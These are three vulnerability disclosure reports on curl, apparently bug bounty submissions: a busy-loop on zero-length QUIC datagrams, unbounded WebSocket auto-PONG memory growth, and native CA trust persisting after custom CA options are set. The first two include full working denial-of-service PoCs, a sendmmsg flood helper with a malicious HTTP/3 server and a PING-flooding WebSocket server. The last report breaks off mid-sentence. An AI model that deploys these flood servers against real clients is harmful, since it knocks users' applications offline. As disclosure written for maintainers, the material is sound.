title: CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
body:
## Summary:
curl's QUIC UDP receive helper ignores zero-length UDP datagrams before counting them against the per-call packet budget. On Linux, `recvmmsg_packets()` loops while `pkts < max_pkts`, but `if(!mmsg[i].msg_len) continue;` runs before `pkts` is incremented. The `recvmsg_packets()` backend has the same no-progress pattern for `if(!nread) continue;`. A malicious HTTP/3/QUIC peer can continuously send zero-length UDP datagrams to the connected QUIC socket and keep curl inside `vquic_recv_packets(..., max_pkts=1000, ...)`. In my end-to-end CLI PoC with a real HTTP/3 server that completed the QUIC handshake before switching to zero-length datagrams, `curl --http3-only --max-time 2` was still running after 30 seconds and had to be killed; the same setup also reproduced with `WAIT_SECS=60` locally. The fallback `recvfrom_packets()` already counts a received datagram before skipping zero-length payloads, which indicates the safer intended budget accounting.

## Affected version
Validated on Linux x86_64 with an HTTP/3-enabled curl built from the signed `curl-8_20_0` release tag. In this repository snapshot the tag's `curlver.h` still reports `8.20.0-DEV`, but the tag object is `curl-8_20_0` with tag message `8.20.0`.

`curl -V` from the reproduced build:

```text
curl 8.20.0-DEV (Linux) libcurl/8.20.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets
```

Source tags checked:

- `curl-8_18_0`, `curl-8_19_0`, and `curl-8_20_0` contain the vulnerable zero-length skip before `pkts` is advanced in `recvmmsg_packets()` and `recvmsg_packets()`.
- `curl-8_17_0` does not contain this same zero-length skip pattern.
- Current master / `8.21.0-DEV` also contains the pattern.

Relevant code in `lib/vquic/vquic.c`:

```c
while(pkts < max_pkts) {
  ...
  if(!mmsg[i].msg_len)
    continue;
  ...
  pkts += (mmsg[i].msg_len + gso_size - 1) / gso_size;
}

for(pkts = 0; pkts < max_pkts;) {
  ...
  if(!nread)
    continue;
  ...
  pkts += (nread + gso_size - 1) / gso_size;
}

/* contrast: recvfrom_packets() */
++pkts;
if(!nread)
  continue;
```

## Steps To Reproduce:
Run the following self-contained CLI PoC on Linux. It does not call any repository-local PoC file and does not hook or modify curl. The script writes temporary helper sources under `mktemp`, compiles a `sendmmsg()`-based zero-length flood helper, starts a real `aioquic` HTTP/3 server, completes the QUIC handshake, sends a minimal HTTP/3 response byte, and then switches the same peer address/port to continuous zero-length UDP datagrams.

The script first tries `CURL_BIN`, then common in-tree HTTP/3 builds, then `curl` from `PATH`. By default it checks whether `curl --http3-only --max-time 2` is still stuck after 30 seconds; `WAIT_SECS=60` also reproduced locally. If `aioquic` / `cryptography` are missing, it tries `python3 -m pip install --user aioquic cryptography service_identity` automatically.

```bash
bash <<'BASH'
set -euo pipefail

CURL_BIN="${CURL_BIN:-}"
WAIT_SECS="${WAIT_SECS:-30}"
MAX_TIME="${MAX_TIME:-2}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-2}"
ZERO_FLOOD_HELPERS="${ZERO_FLOOD_HELPERS:-64}"

need() {
  command -v "$1" >/dev/null 2>&1 || { echo "$1 is required" >&2; exit 2; }
}

need python3
need cc

pick_curl() {
  local c
  for c in \
    "${CURL_BIN:-}" \
    "$PWD"/build-http3-curl/src/curl \
    "$PWD"/scratch/build-curl-8.20.0-http3/src/curl \
    "$PWD"/build-*/src/curl \
    "$(command -v curl 2>/dev/null || true)"; do
    [ -n "$c" ] || continue
    [ -x "$c" ] || continue
    "$c" -V 2>/dev/null | grep -q 'HTTP3' || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

CURL_BIN="$(pick_curl || true)"
[ -n "$CURL_BIN" ] || {
  echo "No HTTP/3-enabled curl binary found. Set CURL_BIN=/path/to/http3-curl." >&2
  exit 2
}

TMPDIR="$(mktemp -d)"
SRV_PID=""
CURL_PID=""
trap 'set +e; [ -n "$CURL_PID" ] && kill "$CURL_PID" 2>/dev/null; [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null; rm -rf "$TMPDIR"' EXIT

if ! python3 - <<'PY' >/dev/null 2>&1; then
import aioquic  # noqa: F401
import cryptography  # noqa: F401
PY
  if python3 -m pip --version >/dev/null 2>&1; then
    echo "Installing Python deps: aioquic cryptography service_identity" >&2
    python3 -m pip install --user aioquic cryptography service_identity
  else
    echo "Missing Python deps: aioquic and cryptography" >&2
    exit 2
  fi
fi

python3 - <<'PY' >/dev/null 2>&1 || {
import aioquic  # noqa: F401
import cryptography  # noqa: F401
PY
  echo "Failed to import aioquic / cryptography after installation attempt" >&2
  exit 2
}

cat > "$TMPDIR/sendmmsg_zero_flood_helper.c" <<'HELPER_C'
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef BATCH
#define BATCH 1024
#endif

static volatile sig_atomic_t stop_flag;

static void on_signal(int signo)
{
  (void)signo;
  stop_flag = 1;
}

int main(int argc, char **argv)
{
  struct sockaddr_in peer;
  struct iovec iov[BATCH];
  struct mmsghdr msg[BATCH];
  unsigned char dummy = 0;
  unsigned long long sent_datagrams = 0;
  unsigned long long send_calls = 0;
  unsigned long long send_errors = 0;
  int fd;
  int i;

  if(argc != 4) {
    fprintf(stderr, "usage: %s <fd> <ip> <port>\n", argv[0]);
    return 2;
  }

  signal(SIGTERM, on_signal);
  signal(SIGINT, on_signal);

  fd = atoi(argv[1]);
  memset(&peer, 0, sizeof(peer));
  peer.sin_family = AF_INET;
  peer.sin_port = htons((uint16_t)atoi(argv[3]));
  if(inet_pton(AF_INET, argv[2], &peer.sin_addr) != 1) {
    perror("inet_pton");
    return 2;
  }

  memset(msg, 0, sizeof(msg));
  memset(iov, 0, sizeof(iov));
  for(i = 0; i < BATCH; ++i) {
    iov[i].iov_base = &dummy;
    iov[i].iov_len = 0;
    msg[i].msg_hdr.msg_iov = &iov[i];
    msg[i].msg_hdr.msg_iovlen = 1;
    msg[i].msg_hdr.msg_name = &peer;
    msg[i].msg_hdr.msg_namelen = sizeof(peer);
  }

  while(!stop_flag) {
    int rc = sendmmsg(fd, msg, BATCH, 0);
    if(rc > 0) {
      sent_datagrams += (unsigned)rc;
      ++send_calls;
    }
    else if(rc < 0) {
      if(errno != EINTR) {
        ++send_errors;
        if(errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS)
          usleep(100);
      }
    }
  }

  printf("PEER_STATS sent_datagrams=%llu send_calls=%llu send_errors=%llu\n",
         sent_datagrams, send_calls, send_errors);
  fflush(stdout);
  return 0;
}
HELPER_C

cat > "$TMPDIR/server.py" <<'PY'
#!/usr/bin/env python3
import asyncio
import contextlib
import ipaddress
import os
import signal
import socket
import subprocess
import tempfile
from datetime import datetime, timedelta
from typing import Optional, Tuple

from aioquic.asyncio import QuicConnectionProtocol
from aioquic.asyncio.server import QuicServer
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import HandshakeCompleted, ProtocolNegotiated, QuicEvent
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID


def make_cert_pair(tmpdir: str) -> Tuple[str, str]:
    key = ec.generate_private_key(ec.SECP256R1())
    subject = issuer = x509.Name(
        [x509.NameAttribute(NameOID.COMMON_NAME, "localhost")]
    )
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow() - timedelta(days=1))
        .not_valid_after(datetime.utcnow() + timedelta(days=7))
        .add_extension(
            x509.SubjectAlternativeName(
                [
                    x509.DNSName("localhost"),
                    x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                ]
            ),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    cert_path = os.path.join(tmpdir, "cert.pem")
    key_path = os.path.join(tmpdir, "key.pem")
    with open(cert_path, "wb") as fp:
        fp.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(key_path, "wb") as fp:
        fp.write(
            key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.PKCS8,
                serialization.NoEncryption(),
            )
        )
    return cert_path, key_path


class ZeroFloodProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http: Optional[H3Connection] = None
        self._peer = None
        self._flood_procs = []
        self._flood_socks = []
        self._attack_mode = False

    def connection_made(self, transport):
        super().connection_made(transport)
        sock = transport.get_extra_info("socket")
        if sock is not None:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)

    def datagram_received(self, data, addr):
        self._peer = addr
        if self._attack_mode:
            return
        super().datagram_received(data, addr)

    def quic_event_received(self, event: QuicEvent) -> None:
        if isinstance(event, ProtocolNegotiated) and event.alpn_protocol in H3_ALPN:
            self._http = H3Connection(self._quic)
            self.transmit()

        if self._http is not None:
            for h3_event in self._http.handle_event(event):
                if isinstance(h3_event, HeadersReceived) and not self._attack_mode:
                    self._http.send_headers(
                        h3_event.stream_id,
                        [
                            (b":status", b"200"),
                            (b"server", b"aioquic-zero"),
                            (b"content-type", b"text/plain"),
                        ],
                        end_stream=False,
                    )
                    self._http.send_data(h3_event.stream_id, b"x", end_stream=False)
                    super().transmit()
                    self._attack_mode = True
                    self._start_flood()
                self.transmit()

        if isinstance(event, HandshakeCompleted):
            print(f"HANDSHAKE_COMPLETED alpn={event.alpn_protocol}", flush=True)

    def transmit(self) -> None:
        if self._attack_mode:
            return
        super().transmit()

    def close(self) -> None:
        self._stop_flood()
        super().close()

    def _start_flood(self) -> None:
        if self._peer is None or self._transport is None or self._flood_procs:
            return
        helper = os.environ["ZERO_FLOOD_HELPER"]
        helpers = int(os.environ.get("ZERO_FLOOD_HELPERS", "64"))
        bind_addr = self._transport.get_extra_info("socket").getsockname()
        for _ in range(helpers):
            flood_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if hasattr(socket, "SO_REUSEPORT"):
                flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            flood_sock.bind(bind_addr)
            self._flood_socks.append(flood_sock)
            proc = subprocess.Popen(
                [helper, str(flood_sock.fileno()), self._peer[0], str(self._peer[1])],
                pass_fds=(flood_sock.fileno(),),
            )
            self._flood_procs.append(proc)
        print(f"ZERO_FLOOD_STARTED helper=sendmmsg helpers={helpers}", flush=True)

    def _stop_flood(self) -> None:
        for proc in self._flood_procs:
            with contextlib.suppress(ProcessLookupError):
                proc.terminate()
        for proc in self._flood_procs:
            with contextlib.suppress(subprocess.TimeoutExpired):
                proc.wait(timeout=1.0)
        for flood_sock in self._flood_socks:
            with contextlib.suppress(OSError):
                flood_sock.close()
        self._flood_procs = []
        self._flood_socks = []


async def main() -> int:
    tmpdir = tempfile.mkdtemp(prefix="aioquic-zero-")
    cert_path, key_path = make_cert_pair(tmpdir)
    configuration = QuicConfiguration(alpn_protocols=H3_ALPN, is_client=False)
    configuration.load_cert_chain(cert_path, key_path)
    configuration.idle_timeout = 300.0

    loop = asyncio.get_running_loop()
    _, server = await loop.create_datagram_endpoint(
        lambda: QuicServer(
            configuration=configuration,
            create_protocol=ZeroFloodProtocol,
            session_ticket_fetcher=None,
            session_ticket_handler=None,
            retry=False,
            stream_handler=None,
        ),
        local_addr=("127.0.0.1", 0),
        reuse_port=True,
    )
    print(f"PORT={server._transport.get_extra_info('sockname')[1]}", flush=True)

    stop_event = asyncio.Event()

    def stop(*_args):
        stop_event.set()

    with contextlib.suppress(NotImplementedError):
        loop.add_signal_handler(signal.SIGTERM, stop)
        loop.add_signal_handler(signal.SIGINT, stop)

    await stop_event.wait()
    server.close()
    await asyncio.sleep(0)
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
PY

cc -O2 -Wall -Wextra \
  "$TMPDIR/sendmmsg_zero_flood_helper.c" \
  -o "$TMPDIR/sendmmsg_zero_flood_helper"

echo "curl_bin=$CURL_BIN"
"$CURL_BIN" -V | sed -n '1,4p'

SRV_LOG="$TMPDIR/server.log"
CURL_ERR="$TMPDIR/curl.err"
CURL_OUT="$TMPDIR/curl.out"

PYTHONWARNINGS=ignore \
ZERO_FLOOD_HELPER="$TMPDIR/sendmmsg_zero_flood_helper" \
ZERO_FLOOD_HELPERS="$ZERO_FLOOD_HELPERS" \
python3 -u "$TMPDIR/server.py" >"$SRV_LOG" 2>&1 &
SRV_PID=$!

PORT=""
for _ in $(seq 1 200); do
  if ! kill -0 "$SRV_PID" 2>/dev/null; then
    echo "server exited before becoming ready" >&2
    cat "$SRV_LOG" >&2 || true
    exit 2
  fi
  PORT="$(sed -n 's/^PORT=//p' "$SRV_LOG" | head -n 1)"
  [ -n "$PORT" ] && break
  sleep 0.05
done

[ -n "$PORT" ] || {
  echo "server did not print a port" >&2
  cat "$SRV_LOG" >&2 || true
  exit 2
}

URL="https://127.0.0.1:$PORT/"
START_S="$(date +%s)"
"$CURL_BIN" -q --http3-only --max-time "$MAX_TIME" --connect-timeout "$CONNECT_TIMEOUT" \
  --noproxy '*' -k -sS "$URL" >"$CURL_OUT" 2>"$CURL_ERR" &
CURL_PID=$!

sleep "$WAIT_SECS"
if kill -0 "$CURL_PID" 2>/dev/null; then
  CURL_STILL_RUNNING=1
  kill -KILL "$CURL_PID" 2>/dev/null || true
  wait "$CURL_PID" 2>/dev/null || true
  CURL_EXIT="killed"
else
  CURL_STILL_RUNNING=0
  set +e
  wait "$CURL_PID"
  CURL_EXIT="$?"
  set -e
fi
CURL_PID=""
END_S="$(date +%s)"

kill "$SRV_PID" 2>/dev/null || true
wait "$SRV_PID" 2>/dev/null || true
SRV_PID=""

echo "url=$URL"
echo "requested_max_time=$MAX_TIME"
echo "observed_seconds=$((END_S - START_S))"
echo "curl_still_running_after_${WAIT_SECS}s=$CURL_STILL_RUNNING"
echo "curl_exit=$CURL_EXIT"
sed -n '1,20p' "$SRV_LOG"
if [ -s "$CURL_ERR" ]; then
  echo "curl_stderr_begin"
  sed -n '1,20p' "$CURL_ERR"
  echo "curl_stderr_end"
fi

if [ "$CURL_STILL_RUNNING" = "1" ] &&
   grep -q '^HANDSHAKE_COMPLETED' "$SRV_LOG" &&
   grep -q '^ZERO_FLOOD_STARTED' "$SRV_LOG"; then
  echo "VULNERABLE: completed QUIC handshake and then zero-length UDP datagrams kept curl running past --max-time."
  exit 0
fi

echo "NOT REPRODUCED"
exit 1
BASH
```

Example output from my local `build-http3-curl/src/curl` build:

```text
curl_bin=/home/yanzhen/curl/curl/build-http3-curl/src/curl
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets
url=https://127.0.0.1:50949/
requested_max_time=2
observed_seconds=30
curl_still_running_after_30s=1
curl_exit=killed
PORT=50949
HANDSHAKE_COMPLETED alpn=h3
ZERO_FLOOD_STARTED helper=sendmmsg helpers=64
PEER_STATS sent_datagrams=1106944 send_calls=1081 send_errors=0
PEER_STATS sent_datagrams=1084416 send_calls=1059 send_errors=0
...
VULNERABLE: completed QUIC handshake and then zero-length UDP datagrams kept curl running past --max-time.
```

The key property here is that the server is a real QUIC/H3 peer first and only
switches to zero-length UDP datagrams after the client has completed the
handshake and started HTTP/3. In my local validation, this same setup also kept
curl stuck past `WAIT_SECS=60` before I killed it.

## Impact

## Summary:
A malicious HTTP/3/QUIC peer can remotely deny service to a curl/libcurl client by continuously sending zero-length UDP datagrams from the connected QUIC peer address. The datagrams are not valid QUIC packets, but the affected receive helpers consume them without counting them against `max_pkts`, so the current `vquic_recv_packets()` call can remain busy until the socket becomes empty or the process is externally killed. During that time normal transfer-level escape paths, including command-line `--max-time` / `CURLOPT_TIMEOUT` handling, do not get a chance to run because control does not return to the caller. For applications using libcurl in a single-threaded multi/event loop, this can also starve unrelated transfers or application work sharing the same loop. The attacker does not need memory corruption or authentication bypass; the impact is CPU/event-loop resource exhaustion and stuck transfers for HTTP/3/QUIC clients.

title: CVE-2026-11586: WS Auto-PONG memory exhaustion
weakness: Allocation of Resources Without Limits or Throttling
body:
## Summary:
TL;DR: a remote WebSocket peer can make default curl/libcurl grow memory until timeout or OOM by sending legal `PING` frames while refusing to read the client's automatic `PONG`s.




curl automatically replies to each received WebSocket `PING` with a `PONG` unless `CURLWS_NOAUTOPONG` is set. In `lib/ws.c`, `ws_enc_add_cntrl()` queues the generated `PONG` into `ws->sendbuf` and ignores the result of `ws_flush()`, while `ws->sendbuf` is initialized with `BUFQ_OPT_SOFT_LIMIT`. A malicious WebSocket peer can complete a valid upgrade, stop reading client data, and keep sending legal `PING` frames so curl continues appending internal `PONG`s without an effective hard limit. This is not just a never-ending transfer: even with `--max-time 8`, the default CLI path can hit `1 GiB` RSS in about 2 seconds locally, and under a 180 MiB address-space limit it exits with `curl: (27) Out of memory`. The same input with `CURLWS_NOAUTOPONG` does not show comparable memory growth. As a temporary mitigation, a smaller `--max-time` / `CURLOPT_TIMEOUT` reduces the attack window, while `CURLWS_NOAUTOPONG` avoids this default auto-PONG queueing path entirely.

## Affected version
Reproduced on current local build:

```text
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV zlib/1.2.11 libpsl/0.21.0 nghttp2/1.40.0
Release-Date: [unreleased]
Protocols: dict file ftp gopher http imap ipfs ipns mqtt pop3 rtsp smtp telnet tftp ws
Features: alt-svc AsynchDNS HTTP2 IPv6 Largefile libz PSL threadsafe UnixSockets
```

Preliminary version triage:

- Current `master` / `8.21.0-DEV` reproduces.
- The vulnerable auto-PONG queueing path appears to have been introduced by commit `0b09132877` (`websocket: handling of PONG frames`).
- Based on tag containment, the first released version that appears to contain this specific path is `8.16.0`.
- Initial review suggests `8.15.x` and earlier do not contain this same queued auto-PONG implementation.

Relevant code paths:

```c
/* lib/ws.c */
if(!ws->enc.payload_remain) {
  CURLcode result = ws_enc_add_pending(data, ws);
  if(!result)
    (void)ws_flush(data, ws, Curl_is_in_callback(data));
  return result;
}

/* sendbuf uses BUFQ_OPT_SOFT_LIMIT */
Curl_bufq_init2(&ws->sendbuf, chunk_size, WS_CHUNK_COUNT, BUFQ_OPT_SOFT_LIMIT);
```

## Steps To Reproduce:
From a curl source checkout with a WebSocket-enabled build, run this single self-contained PoC. It does not call any repository-local PoC file.

```bash
CURL_BIN="${CURL_BIN:-./build-codex-h2-nosan/src/curl}" python3 - <<'PY'
import base64, hashlib, os, re, resource, socket, subprocess, threading, time
st = {}

def srv():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    s.listen(1)
    st["p"] = s.getsockname()[1]

    c, _ = s.accept()
    c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    req = b""
    while b"\r\n\r\n" not in req:
        req += c.recv(4096)

    k = re.search(rb"(?im)^Sec-WebSocket-Key:\s*(\S+)", req).group(1)
    a = base64.b64encode(
        hashlib.sha1(k + b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest()
    ).decode()
    c.sendall(
        (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {a}\r\n\r\n"
        ).encode()
    )

    f = b"\x89\x00" * 65536
    try:
        while True:
            c.sendall(f)
    except OSError:
        pass

threading.Thread(target=srv, daemon=True).start()
while "p" not in st:
    time.sleep(0.01)

rc = subprocess.run(
    [
        os.environ["CURL_BIN"],
        "--silent",
        "--show-error",
        "--max-time",
        "8",
        f"ws://127.0.0.1:{st['p']}/",
    ],
    preexec_fn=lambda: resource.setrlimit(
        resource.RLIMIT_AS, (188743680, 188743680)
    ),
).returncode

print("curl rc =", rc)
PY
```

Expected result:

```text
curl: (27) Out of memory
curl rc = 27
```

For comparison, a `CURLOPT_WS_OPTIONS = CURLWS_NOAUTOPONG` control client processed the same empty-`PING` input without comparable memory growth, and a bounded-time CLI validation reached about `1.05 GiB` RSS in about `1.96` seconds before the verifier stopped it.

Practical mitigation today:

- Set a smaller `--max-time` / `CURLOPT_TIMEOUT` if the WebSocket transfer does not need to stay open long. This only limits how much memory can be forced before timeout.
- Set `CURLWS_NOAUTOPONG` if the application can safely handle WebSocket `PING` frames itself. This avoids the vulnerable default auto-PONG path.

## Impact

## Summary:
A remote WebSocket peer can drive unbounded growth of curl's internal auto-PONG send queue and exhaust the client process memory budget using only legal protocol input after a valid handshake. Depending on available memory and runtime limits, this can terminate the curl command-line tool with `CURLE_OUT_OF_MEMORY`, trigger system/container OOM handling, or cause a libcurl-using application to fail. The issue affects default WebSocket behavior and does not require API misuse, local access, or malformed frames. Smaller timeout values can reduce the damage window, but they do not add backpressure; disabling auto-PONG with `CURLWS_NOAUTOPONG` avoids this specific path.

title: CVE-2026-11564: Native CA trust persist
body:
(Issue found and reported by Trail of Bits, forwarded here for better tracking)

### Title
Native CA trust can persist after an easy handle switches to custom CA material

### Severity
Medium

### Difficulty
High

### Type
Cryptography

### Target
lib/vtls/vtls_config.c, lib/setopt.c

## Description

An easy handle that first uses default native CA trust can continue trusting
the native platform store after the application switches that same handle to
custom CA material for a later transfer.

On builds with `USE_APPLE_SECTRUST` or `CURL_CA_NATIVE`, libcurl automatically
enables the easy handle's `native_ca_store` flag when a transfer uses default
TLS trust material:

```c
#if defined(USE_APPLE_SECTRUST) || defined(CURL_CA_NATIVE)
  if(!sslc->custom_capath && !sslc->custom_cafile && !sslc->custom_cablob)
    sslc->native_ca_store = TRUE;
#endif
```

Figure X.1: Default TLS trust enables `native_ca_store`
(`lib/vtls/vtls_config.c`).

The same function does not reset `native_ca_store` before recomputing TLS
configuration for a later transfer on the same easy handle. The setters for
custom trust material only mark the corresponding custom-CA flag and store the
new value:

```c
case CURLOPT_CAINFO:
  s->ssl.custom_cafile = TRUE;
  return Curl_setstropt(&s->str[STRING_SSL_CAFILE], ptr);
...
case CURLOPT_CAPATH:
  s->ssl.custom_capath = TRUE;
  return Curl_setstropt(&s->str[STRING_SSL_CAPATH], ptr);
...
case CURLOPT_CAINFO_BLOB:
  s->ssl.custom_cablob = TRUE;
  return Curl_setblobopt(&s->blobs[BLOB_CAINFO], blob);
```

Figure X.2: Custom CA options do not clear `native_ca_store`
(`lib/setopt.c`).

As a result, an easy handle that first completes a transfer with default CA
configuration can keep `ssl.native_ca_store = TRUE` after the application later
sets `CURLOPT_CAINFO`, `CURLOPT_CAPATH`, or `CURLOPT_CAINFO_BLOB` to narrow
trust. On backend/platform combinations that implement native CA lookup, TLS
backends then continue to consult native trust when preparing the next
handshake. For example, OpenSSL consults native trust on the platforms where
that path is implemented, while Rustls selects the platform verifier instead
of the configured CA verifier when the flag is set:

```c
if(ssl_config->native_ca_store) {
  ...
}
```

Figure X.3: OpenSSL uses the stale `native_ca_store` flag while loading trust
anchors (`lib/vtls/openssl.c`).

```c
else if(ssl_config->native_ca_store) {
  result = init_config_builder_platform_verifier(data, config_builder);
  ...
}
else if(ca_info_blob || ssl_cafile) {
  result = init_config_builder_verifier(data, config_builder,
                                        conn_config, ca_info_blob,
                                        ssl_cafile);
  ...
}
```

Figure X.4: Rustls prefers the platform verifier over custom CA material when
`native_ca_store` is set (`lib/vtls/rustls.c`).

For Rustls, explicit `CURLSSLOPT_NATIVE_CA` has documented special behavior:
when that option is used, only the native CA store is consulted. The stale-state
issue here is different: two handles can reach the same final public option
state, with `CURLOPT_CAINFO_BLOB` set and no explicit
`CURLSSLOPT_NATIVE_CA`, but use different trust stores depending only on handle
history.

```c
/* Fresh handle: custom CA is present before TLS config is completed. */
CURL *fresh = curl_easy_init();
curl_easy_setopt(fresh, CURLOPT_CAINFO_BLOB, &private_ca);
curl_easy_perform(fresh); /* native_ca_store is not auto-enabled */

/* Reused handle: an earlier default-trust transfer set native_ca_store. */
CURL *reused = curl_easy_init();
curl_easy_setopt(reused, CURLOPT_URL, "https://public.example/");
curl_easy_perform(reused); /* native_ca_store becomes TRUE */

curl_easy_setopt(reused, CURLOPT_URL, "https://api.example/");
curl_easy_setopt(reused, CURLOPT_CAINFO_BLOB, &private_ca);
curl_easy_perform(reused); /* native_ca_store can remain TRUE */
```

A fresh easy handle that sets `CURLOPT_CAINFO_BLOB` before its first transfer
does not auto-enable `native_ca_store`, because `Curl_ssl_easy_config_complete`
only auto-enables native trust when no custom CA file, path, or blob is
present. The reused handle retains `native_ca_store = TRUE` solely because an
earlier transfer used default trust. That history-dependent difference is the
trust-policy confusion.

This weakens the documented effect of the custom CA options. This does not
require changing options during an active transfer: libcurl explicitly supports
and encourages reusing an easy handle across sequential transfers and changing
options between `curl_easy_perform()` calls. An application can reasonably
reuse an easy handle, perform one ordinary HTTPS request, and then set
`CURLOPT_CAINFO` or `CURLOPT_CAINFO_BLOB` for a subsequent request that is
supposed to trust only the supplied CA material. On affected builds, that
subsequent request can still accept certificates trusted by the native platform
store if it performs a new TLS handshake through a backend that actually
consults `native_ca_store`. Schannel is not affected by this specific automatic
native-CA branch; other backends differ in whether stale native trust broadens
the configured trust set or, as with Rustls, selects platform verification
instead of the custom verifier.

This falls under curl's threat model because TLS certificates and handshake
metadata are attacker-controlled network inputs, and the impact is a TLS
authentication policy bypass. It is not excluded by the disclosure policy's
experimental-feature rule: `CURL_CA_NATIVE` and Apple SecTrust are documented
TLS trust-store features, not debug-only or experimental code.

The standalone local POC completes default TLS config on a native-CA-enabled
build, then sets `CURLOPT_CAINFO` and completes TLS config again. It confirms
that `custom_cafile` becomes true while `native_ca_store` remains true. The PoC
proves the stale internal TLS policy state; the end-to-end certificate
acceptance impact is inferred from the backend code paths that consume
`native_ca_store`.

```c
#if defined(USE_APPLE_SECTRUST) || defined(CURL_CA_NATIVE)
  fail_unless(((struct Curl_easy *)curl)->set.ssl.native_ca_store,
              "default TLS config should enable native CA store");
  curl_easy_setopt(curl, CURLOPT_CAINFO, "custom-ca.pem");
  if(Curl_ssl_easy_config_complete((struct Curl_easy *)curl, origin))
    goto unit_test_abort;
  fail_unless(((struct Curl_easy *)curl)->set.ssl.custom_cafile,
              "custom CAfile flag should be set");
  fail_unless(((struct Curl_easy *)curl)->set.ssl.native_ca_store,
              "custom CAfile after default config keeps native CA store");
#endif
```

Figure X.5: The standalone POC assertion confirms stale native-CA state.

## Reproduction

Use a NativeCA-enabled build for this check:

```sh
cmake -S . -B build-review-native -G Ninja \
  -DENABLE_DEBUG=ON -DCURL_CA_NATIVE=ON \
  -DBUILD_TESTING=ON -DBUILD_CURL_EXE=OFF -DBUILD_EXAMPLES=OFF \
  -DCURL_USE_LIBPSL=OFF
cmake --build build-review-native --target curlu units -j8
```

Figure X.6: Build commands for a NativeCA-enabled review build.

The standalone local POC is
`_loose_review/valid/confirmed-valid/native-ca-state-persists-after-custom-ca/poc_native_ca_stale_after_custom_ca.c`. It completes
default TLS config on a `CURL_CA_NATIVE=ON` build, sets `CURLOPT_CAINFO`, then
completes TLS config again and verifies that `custom_cafile` and
`native_ca_store` are both true.

Build and run the standalone POC against the NativeCA-enabled build:

```sh
python3 _loose_review/valid/build_internal_poc.py build-review-native \
  _loose_review/valid/confirmed-valid/native-ca-state-persists-after-custom-ca/poc_native_ca_stale_after_custom_ca.c \
  build-review-native/poc_native_ca_stale_after_custom_ca
build-review-native/poc_native_ca_stale_after_custom_ca
```

The local run printed:

```text
CONFIRMED: native_ca_store persists after switching the easy handle to custom CAINFO.
```

## Exploit Scenario

A long-running application or handle pool uses one easy handle for multiple
sequential HTTPS requests on a curl build where `native_ca_store` is
auto-enabled and the selected TLS backend implements native CA lookup. For
example, the first transfer performs an ordinary public HTTPS request using
default TLS trust, which causes libcurl to set `native_ca_store = TRUE`. After
that transfer completes, the application reuses the same easy handle, sets
`CURLOPT_CAINFO_BLOB` to a private trust bundle for `https://api.example`, and
expects the next transfer to trust only that supplied CA material.

If the second request performs a new TLS handshake, an attacker who can present
a certificate for `api.example` that chains to the platform native store, but
not to the application's custom bundle, can still complete the TLS handshake on
affected backend/platform combinations. The application intended to narrow
trust for the second request, but stale easy-handle state leaves native trust
enabled.

The same stale-state pattern applies to HTTPS proxy TLS trust when
`CURLOPT_PROXY_CAINFO`, `CURLOPT_PROXY_CAPATH`, or
`CURLOPT_PROXY_CAINFO_BLOB` is set after a default proxy TLS configuration
enabled native trust.

## Recommendations

Short term, recompute `native_ca_store` from current options in
`Curl_ssl_easy_config_complete` instead of only setting it true. Clear it when
any custom CA file, CA path, or CA blob is present unless
`CURLSSLOPT_NATIVE_CA` was explicitly requested.

Long term, separate explicit `CURLSSLOPT_NATIVE_CA` state from automatic
default-native trust state, and add regression tests for easy-handle reuse that
switches from default trust to `CURLOPT_CAINFO`, `CURLOPT_CAPATH`,
